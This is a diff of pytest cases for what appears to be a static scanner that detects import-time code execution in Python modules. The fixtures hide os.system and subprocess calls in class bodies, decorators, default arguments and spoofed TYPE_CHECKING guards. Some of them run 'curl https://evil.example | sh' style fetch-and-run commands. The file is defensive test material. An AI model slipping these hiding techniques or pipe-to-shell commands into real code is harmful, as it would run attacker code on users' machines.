@@ -89,9 +89,144 @@ except Exception:
     assert any("subprocess.run" in f.detail for f in findings)
 
 
+def test_class_body_payload_flagged(tmp_path: Path) -> None:
+    """A class body executes at import time — the textbook hiding
+    spot for an import-time payload."""
+    _write(tmp_path / "evil.py", """\
+import os
+class _Config:
+    os.system("curl https://evil.example | sh")
+""")
+    findings = scan_target(tmp_path, [])
+    assert any("os.system" in f.detail for f in findings)
+
+
+def test_decorator_expression_flagged(tmp_path: Path) -> None:
+    """Decorator expressions evaluate at definition time (import)."""
+    _write(tmp_path / "evil.py", """\
+import subprocess
+@subprocess.run(["curl", "https://evil.example/x.sh"])
+def innocent():
+    pass
+""")
+    findings = scan_target(tmp_path, [])
+    assert any("subprocess.run" in f.detail for f in findings)
+
+
+def test_default_argument_payload_flagged(tmp_path: Path) -> None:
+    """Argument defaults evaluate once, at definition time."""
+    _write(tmp_path / "evil.py", """\
+import os
+def innocent(x=os.system("payload")):
+    pass
+""")
+    findings = scan_target(tmp_path, [])
+    assert any("os.system" in f.detail for f in findings)
+
+
+def test_method_default_inside_class_flagged(tmp_path: Path) -> None:
+    _write(tmp_path / "evil.py", """\
+import os
+class C:
+    def m(self, x=os.system("payload")):
+        pass
+""")
+    findings = scan_target(tmp_path, [])
+    assert any("os.system" in f.detail for f in findings)
+
+
+def test_self_assigned_type_checking_gets_no_guard_credit(
+    tmp_path: Path,
+) -> None:
+    """A module that ASSIGNS ``TYPE_CHECKING = True`` executes its
+    "guarded" body at import — the guard must not suppress."""
+    _write(tmp_path / "evil.py", """\
+import os
+TYPE_CHECKING = True
+if TYPE_CHECKING:
+    os.system("payload")
+""")
+    findings = scan_target(tmp_path, [])
+    assert any("os.system" in f.detail for f in findings)
+
+
+def test_type_checking_rebind_after_import_revokes_guard(
+    tmp_path: Path,
+) -> None:
+    """A genuine typing import followed by ``TYPE_CHECKING = True``
+    runs the "guarded" body at import — the rebind must revoke the
+    credit the import earned."""
+    _write(tmp_path / "evil.py", """\
+import os
+from typing import TYPE_CHECKING
+TYPE_CHECKING = True
+if TYPE_CHECKING:
+    os.system("payload")
+""")
+    findings = scan_target(tmp_path, [])
+    assert any("os.system" in f.detail for f in findings)
+
+
+def test_typing_module_rebind_revokes_attribute_guard(
+    tmp_path: Path,
+) -> None:
+    """``import typing as t`` then ``t = fake`` — the attribute-form
+    guard must not survive the module-name rebind."""
+    _write(tmp_path / "evil.py", """\
+import os
+import typing as t
+class _Fake:
+    TYPE_CHECKING = True
+t = _Fake
+if t.TYPE_CHECKING:
+    os.system("payload")
+""")
+    findings = scan_target(tmp_path, [])
+    assert any("os.system" in f.detail for f in findings)
+
+
+def test_import_alias_resolved(tmp_path: Path) -> None:
+    """``import subprocess as sp`` must not defeat the vocab match."""
+    _write(tmp_path / "evil.py", """\
+import subprocess as sp
+sp.run(["curl", "https://evil.example/x.sh"])
+""")
+    findings = scan_target(tmp_path, [])
+    assert any("sp.run" in f.detail for f in findings)
+
+
 # ---------------------------------------------------------------------------
 # Should NOT flag
 # ---------------------------------------------------------------------------
+
+
+def test_aliased_type_checking_import_honoured(tmp_path: Path) -> None:
+    _write(tmp_path / "ok.py", """\
+from typing import TYPE_CHECKING as TC
+
+if TC:
+    import requests
+""")
+    assert scan_target(tmp_path, []) == []
+
+
+def test_typing_attribute_guard_honoured(tmp_path: Path) -> None:
+    _write(tmp_path / "ok.py", """\
+import typing
+
+if typing.TYPE_CHECKING:
+    import requests
+""")
+    assert scan_target(tmp_path, []) == []
+
+
+def test_top_level_lambda_body_not_flagged(tmp_path: Path) -> None:
+    """A lambda body is deferred until called — not import-time."""
+    _write(tmp_path / "ok.py", """\
+import os
+handler = lambda: os.system("date")
+""")
+    assert scan_target(tmp_path, []) == []
 
 def test_imports_alone_not_flagged(tmp_path: Path) -> None:
     _write(tmp_path / "ok.py", """\
